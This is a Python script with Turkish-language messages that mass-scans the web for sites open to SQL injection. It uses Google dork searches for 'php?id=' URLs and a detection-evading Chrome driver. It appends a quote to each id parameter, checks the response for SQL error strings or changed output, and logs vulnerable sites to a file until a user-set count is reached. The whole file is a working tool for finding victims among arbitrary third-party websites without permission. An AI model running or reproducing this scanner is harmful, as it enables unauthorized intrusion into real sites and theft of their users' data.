import time
import re
import json
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import undetected_chromedriver as uc
import os

error_keywords = [
    "sql syntax", "mysql_fetch", "odbc", "you have an error",
    "supplied argument is not a valid mysql", "mysql_num_rows",
    "warning:", "sqlstate"
]

progress_file = "progress.json"

def load_progress():
    if os.path.exists(progress_file):
        with open(progress_file, "r") as f:
            data = json.load(f)
            return data.get("page", 0), set(data.get("checked_urls", [])), data.get("success_count", 0)
    else:
        return 0, set(), 0

def save_progress(page, checked_urls, success_count):
    with open(progress_file, "w") as f:
        json.dump({
            "page": page,
            "checked_urls": list(checked_urls),
            "success_count": success_count
        }, f)

target_success_count = int(input("Kaç tane açık site bulunsun?: "))

chrome_options = Options()
chrome_options.add_argument("--window-position=0,1000")
chrome_options.add_argument("--start-minimized")

driver = uc.Chrome(options=chrome_options)

page, checked_urls, success_count = load_progress()

continue_scanning = True

while continue_scanning:
    print(f"[INFO] Google araması sayfa: {page}")
    search_url = f"https://www.google.com/search?q=inurl:php?=id&start={(page-1)*10}"
    driver.get(search_url)
    time.sleep(3)

    links = driver.find_elements(By.XPATH, "//a")
    urls = []

    for link in links:
        href = link.get_attribute("href")
        if href and "php?id=" in href:
            match = re.search(r'php\?id=(\d+)$', href)
            if match and href not in checked_urls:
                urls.append(href)

    if not urls:
        print(f"Sayfa {page}'te uygun link yok, sonraki sayfaya geçiliyor...")
        page += 1
        continue

    for url in urls:
        if url in checked_urls:
            continue

        try:
            driver.get(url)
            time.sleep(2)
            normal_source = driver.page_source.lower()

            vuln_url = url + "'"
            driver.get(vuln_url)
            time.sleep(2)
            test_source = driver.page_source.lower()

            if any(err in test_source for err in error_keywords) or normal_source != test_source:
                with open("sqli_sites.txt", "a") as f:
                    f.write(url + "\n")
                success_count += 1
                print(f"[+] SQLi açığı bulundu ({success_count}/{target_success_count}): {url}")

            checked_urls.add(url)
            save_progress(page, checked_urls, success_count)

            if success_count >= target_success_count:
                print("Hedef site sayısına ulaşıldı.")
                cevap = input("Başka sitelere de bakılsın mı? (E/h): ").strip().lower()
                if cevap == "e":
                    ek_hedef = int(input("Kaç tane daha açılsın?: "))
                    target_success_count += ek_hedef
                    print(f"Yeni hedef: {target_success_count}")
                else:
                    continue_scanning = False
                    break

        except Exception as e:
            print(f"[!] Genel hata: {e}")
            continue

    page += 1 

print("İşlem tamamlandı.")
driver.quit()
